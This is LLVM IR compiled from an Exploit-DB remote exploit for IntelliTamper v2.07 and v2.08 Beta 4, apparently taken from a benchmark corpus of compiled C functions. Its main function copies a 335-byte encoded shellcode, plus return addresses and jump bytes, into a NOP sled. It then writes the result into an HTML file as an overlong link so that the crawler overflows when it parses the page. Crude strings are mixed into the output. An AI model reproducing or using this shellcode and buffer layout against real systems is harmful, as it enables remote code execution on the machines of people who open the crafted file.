; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_6238.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_6238.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@SIZEOF = common dso_local global i32 0, align 4
@__const.main.shellc0de = private unnamed_addr constant [335 x i8] c"\EB\02\EB\05\E8\F9\FF\FF\FF[\80\C3\103\C9f\B9?\01\803\98C\E2\FA\19\\P\98\98\98\13t\13l\CD\CE\FC9\A8\98\98\98\13\D8\94\13\E8\845\13\F0\90s\98\13]\C6\C5\11\9Eg\AE\F0\16\D6\96tp5\98\98\98\F0\AB\AA\98\98\F0\EF\EB\AA\C7\CCgH\13`\CF\F0A\91m5p\0B\98\98\98\ABQ\C9\C9\C9\C9\D9\C9\D9\C9gH\11\DE\BC\CF\F0ta2\F8p\E1\98\98\98\F0\D9\D9\D9\D9\F0\DA\DA\DA\DA\13T\F2\88\C9g\EE\BCgH\F0\FB\F5\FC\98\11\FE\A8g\AE\F0\EAf+\8Ep\C9\98\98\98\11\DE\86\1Bt\CC\15\A4\BC\ABX\ABQ\1BY\8D3ze^\DC\BC\88\DCf\DC\BC\A5f\DC\BC\A4\13\DE\BC\11\DC\BC\D0\11\DC\BC\D4\11\DC\BC\C8\15\DC\BC\88\CC\C8\C9\C9\C9\F2\99\C9\C9g\EE\A8\C9g\CE\86g\AE\F0wVx\F8p\9A\98\98\98gH\CB\CD\CE\CF\13\F4\BC\80\13\DD\A4\13\CC\9D\E0\9BM\13\D2\80\13\C2\B8\9BE{\AA\D1\13\AC\13\9Bm\ABgd\ABX4\A2\\\EC\9FYW\95\9B`sj\A3\E4\BC\8C\EDy\13\C2\BC\9BE\FE\13\94\D3\13\C2\84\9BE\13\9C\13\9B]s\9A\ABX\13M\C7\C6\C5\C3Z\9C\98\00", align 16
@.str = private unnamed_addr constant [44 x i8] c"error: <port> must be between 1 and 65535\0D\0A\00", align 1
@.str.1 = private unnamed_addr constant [31 x i8] c"[S] ip: %s port: %d file: %s\0D\0A\00", align 1
@.str.2 = private unnamed_addr constant [32 x i8] c"[C] Setting universal %-39s ...\00", align 1
@.str.3 = private unnamed_addr constant [10 x i8] c"shellcode\00", align 1
@.str.4 = private unnamed_addr constant [7 x i8] c"DONE\0D\0A\00", align 1
@.str.5 = private unnamed_addr constant [2 x i8] c"w\00", align 1
@.str.6 = private unnamed_addr constant [27 x i8] c"error: unable to open %s\0D\0A\00", align 1
@.str.7 = private unnamed_addr constant [51 x i8] c"[C] Writing magic link for Intellitamper %-20s ...\00", align 1
@.str.8 = private unnamed_addr constant [6 x i8] c"v2.07\00", align 1
@BEGIN = common dso_local global i8* null, align 8
@.str.9 = private unnamed_addr constant [32 x i8] c"sex drugs and rock'n'roll<BR>\0D\0A\00", align 1
@RET_ADDR2 = common dso_local global i64 0, align 8
@RET_POS2 = common dso_local global i64 0, align 8
@SCOFFSET2 = common dso_local global i32 0, align 4
@.str.10 = private unnamed_addr constant [3 x i8] c"\EB\E0\00", align 1
@.str.11 = private unnamed_addr constant [6 x i8] c"\E9\8F\E5\FF\FF\00", align 1
@.str.12 = private unnamed_addr constant [10 x i8] c"<A HREF=\22\00", align 1
@.str.13 = private unnamed_addr constant [23 x i8] c"\22>sexy bitch</A><BR>\0D\0A\00", align 1
@.str.14 = private unnamed_addr constant [13 x i8] c"v2.08 Beta 4\00", align 1
@RET_ADDR = common dso_local global i64 0, align 8
@RET_POS = common dso_local global i64 0, align 8
@SCOFFSET = common dso_local global i32 0, align 4
@.str.15 = private unnamed_addr constant [6 x i8] c"\E9\8F\EB\FF\FF\00", align 1
@.str.16 = private unnamed_addr constant [27 x i8] c"\22>not sexy bitch</A><BR>\0D\0A\00", align 1
@END = common dso_local global i8* null, align 8
@.str.17 = private unnamed_addr constant [19 x i8] c"[C] All job done\0D\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i64, align 8
  %8 = alloca i64, align 8
  %9 = alloca i32*, align 8
  %10 = alloca [335 x i8], align 16
  %11 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %12 = load i32, i32* @SIZEOF, align 4
  %13 = zext i32 %12 to i64
  %14 = call i8* @llvm.stacksave()
  store i8* %14, i8** %6, align 8
  %15 = alloca i8, i64 %13, align 16
  store i64 %13, i64* %7, align 8
  %16 = bitcast [335 x i8]* %10 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %16, i8* align 16 getelementptr inbounds ([335 x i8], [335 x i8]* @__const.main.shellc0de, i32 0, i32 0), i64 335, i1 false)
  %17 = call i32 (...) @banner()
  %18 = load i32, i32* %4, align 4
  %19 = icmp ne i32 %18, 4
  br i1 %19, label %20, label %25

20:                                               ; preds = %2
  %21 = load i8**, i8*** %5, align 8
  %22 = getelementptr inbounds i8*, i8** %21, i64 0
  %23 = load i8*, i8** %22, align 8
  %24 = call i32 @syntax(i8* %23)
  br label %25

25:                                               ; preds = %20, %2
  %26 = load i8**, i8*** %5, align 8
  %27 = getelementptr inbounds i8*, i8** %26, i64 3
  %28 = load i8*, i8** %27, align 8
  %29 = call i64 @atoi(i8* %28)
  store i64 %29, i64* %8, align 8
  %30 = load i64, i64* %8, align 8
  %31 = icmp ule i64 %30, 0
  br i1 %31, label %35, label %32

32:                                               ; preds = %25
  %33 = load i64, i64* %8, align 8
  %34 = icmp ugt i64 %33, 65535
  br i1 %34, label %35, label %37

35:                                               ; preds = %32, %25
  %36 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([44 x i8], [44 x i8]* @.str, i64 0, i64 0))
  store i32 -1, i32* %3, align 4
  store i32 1, i32* %11, align 4
  br label %134

37:                                               ; preds = %32
  %38 = load i8**, i8*** %5, align 8
  %39 = getelementptr inbounds i8*, i8** %38, i64 2
  %40 = load i8*, i8** %39, align 8
  %41 = load i64, i64* %8, align 8
  %42 = load i8**, i8*** %5, align 8
  %43 = getelementptr inbounds i8*, i8** %42, i64 1
  %44 = load i8*, i8** %43, align 8
  %45 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.1, i64 0, i64 0), i8* %40, i64 %41, i8* %44)
  %46 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.2, i64 0, i64 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.3, i64 0, i64 0))
  %47 = load i8**, i8*** %5, align 8
  %48 = getelementptr inbounds i8*, i8** %47, i64 2
  %49 = load i8*, i8** %48, align 8
  %50 = load i64, i64* %8, align 8
  %51 = getelementptr inbounds [335 x i8], [335 x i8]* %10, i64 0, i64 0
  %52 = call i64 @set_sc(i8* %49, i64 %50, i8* %51)
  %53 = icmp ne i64 %52, 0
  br i1 %53, label %54, label %55

54:                                               ; preds = %37
  store i32 -1, i32* %3, align 4
  store i32 1, i32* %11, align 4
  br label %134

55:                                               ; preds = %37
  %56 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.4, i64 0, i64 0))
  %57 = load i8**, i8*** %5, align 8
  %58 = getelementptr inbounds i8*, i8** %57, i64 1
  %59 = load i8*, i8** %58, align 8
  %60 = call i32* @fopen(i8* %59, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i64 0, i64 0))
  store i32* %60, i32** %9, align 8
  %61 = load i32*, i32** %9, align 8
  %62 = icmp ne i32* %61, null
  br i1 %62, label %68, label %63

63:                                               ; preds = %55
  %64 = load i8**, i8*** %5, align 8
  %65 = getelementptr inbounds i8*, i8** %64, i64 1
  %66 = load i8*, i8** %65, align 8
  %67 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.6, i64 0, i64 0), i8* %66)
  store i32 -1, i32* %3, align 4
  store i32 1, i32* %11, align 4
  br label %134

68:                                               ; preds = %55
  %69 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([51 x i8], [51 x i8]* @.str.7, i64 0, i64 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.8, i64 0, i64 0))
  %70 = load i32*, i32** %9, align 8
  %71 = load i8*, i8** @BEGIN, align 8
  %72 = call i32 @fprintf(i32* %70, i8* %71)
  %73 = load i32*, i32** %9, align 8
  %74 = call i32 @fprintf(i32* %73, i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.9, i64 0, i64 0))
  %75 = trunc i64 %13 to i32
  %76 = call i32 @memset(i8* %15, i32 144, i32 %75)
  %77 = load i64, i64* @RET_ADDR2, align 8
  %78 = load i64, i64* @RET_POS2, align 8
  %79 = getelementptr inbounds i8, i8* %15, i64 %78
  %80 = bitcast i8* %79 to i64*
  store i64 %77, i64* %80, align 1
  %81 = load i32, i32* @SCOFFSET2, align 4
  %82 = sext i32 %81 to i64
  %83 = getelementptr inbounds i8, i8* %15, i64 %82
  %84 = getelementptr inbounds [335 x i8], [335 x i8]* %10, i64 0, i64 0
  %85 = call i32 @memcpy(i8* %83, i8* %84, i32 334)
  %86 = getelementptr inbounds i8, i8* %15, i64 6836
  %87 = getelementptr inbounds i8, i8* %86, i64 -8
  %88 = call i32 @memcpy(i8* %87, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.10, i64 0, i64 0), i32 2)
  %89 = getelementptr inbounds i8, i8* %15, i64 6836
  %90 = getelementptr inbounds i8, i8* %89, i64 -16
  %91 = call i32 @memcpy(i8* %90, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.11, i64 0, i64 0), i32 5)
  %92 = load i32*, i32** %9, align 8
  %93 = call i32 @fprintf(i32* %92, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.12, i64 0, i64 0))
  %94 = load i32*, i32** %9, align 8
  %95 = call i32 @fprintf(i32* %94, i8* %15)
  %96 = load i32*, i32** %9, align 8
  %97 = call i32 @fprintf(i32* %96, i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.13, i64 0, i64 0))
  %98 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.4, i64 0, i64 0))
  %99 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([51 x i8], [51 x i8]* @.str.7, i64 0, i64 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.14, i64 0, i64 0))
  %100 = trunc i64 %13 to i32
  %101 = call i32 @memset(i8* %15, i32 144, i32 %100)
  %102 = load i64, i64* @RET_ADDR, align 8
  %103 = load i64, i64* @RET_POS, align 8
  %104 = getelementptr inbounds i8, i8* %15, i64 %103
  %105 = bitcast i8* %104 to i64*
  store i64 %102, i64* %105, align 1
  %106 = load i32, i32* @SCOFFSET, align 4
  %107 = sext i32 %106 to i64
  %108 = getelementptr inbounds i8, i8* %15, i64 %107
  %109 = getelementptr inbounds [335 x i8], [335 x i8]* %10, i64 0, i64 0
  %110 = call i32 @memcpy(i8* %108, i8* %109, i32 334)
  %111 = load i32, i32* @SIZEOF, align 4
  %112 = sext i32 %111 to i64
  %113 = getelementptr inbounds i8, i8* %15, i64 %112
  %114 = getelementptr inbounds i8, i8* %113, i64 -8
  %115 = call i32 @memcpy(i8* %114, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.10, i64 0, i64 0), i32 2)
  %116 = load i32, i32* @SIZEOF, align 4
  %117 = sext i32 %116 to i64
  %118 = getelementptr inbounds i8, i8* %15, i64 %117
  %119 = getelementptr inbounds i8, i8* %118, i64 -16
  %120 = call i32 @memcpy(i8* %119, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.15, i64 0, i64 0), i32 5)
  %121 = load i32*, i32** %9, align 8
  %122 = call i32 @fprintf(i32* %121, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.12, i64 0, i64 0))
  %123 = load i32*, i32** %9, align 8
  %124 = call i32 @fprintf(i32* %123, i8* %15)
  %125 = load i32*, i32** %9, align 8
  %126 = call i32 @fprintf(i32* %125, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.16, i64 0, i64 0))
  %127 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.4, i64 0, i64 0))
  %128 = load i32*, i32** %9, align 8
  %129 = load i8*, i8** @END, align 8
  %130 = call i32 @fprintf(i32* %128, i8* %129)
  %131 = load i32*, i32** %9, align 8
  %132 = call i32 @fclose(i32* %131)
  %133 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.17, i64 0, i64 0))
  store i32 0, i32* %3, align 4
  store i32 1, i32* %11, align 4
  br label %134

134:                                              ; preds = %68, %63, %54, %35
  %135 = load i8*, i8** %6, align 8
  call void @llvm.stackrestore(i8* %135)
  %136 = load i32, i32* %3, align 4
  ret i32 %136
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #2

declare dso_local i32 @banner(...) #3

declare dso_local i32 @syntax(i8*) #3

declare dso_local i64 @atoi(i8*) #3

declare dso_local i32 @printf(i8*, ...) #3

declare dso_local i64 @set_sc(i8*, i64, i8*) #3

declare dso_local i32* @fopen(i8*, i8*) #3

declare dso_local i32 @fprintf(i32*, i8*) #3

declare dso_local i32 @memset(i8*, i32, i32) #3

declare dso_local i32 @memcpy(i8*, i8*, i32) #3

declare dso_local i32 @fclose(i32*) #3

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { argmemonly nounwind willreturn }
attributes #3 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
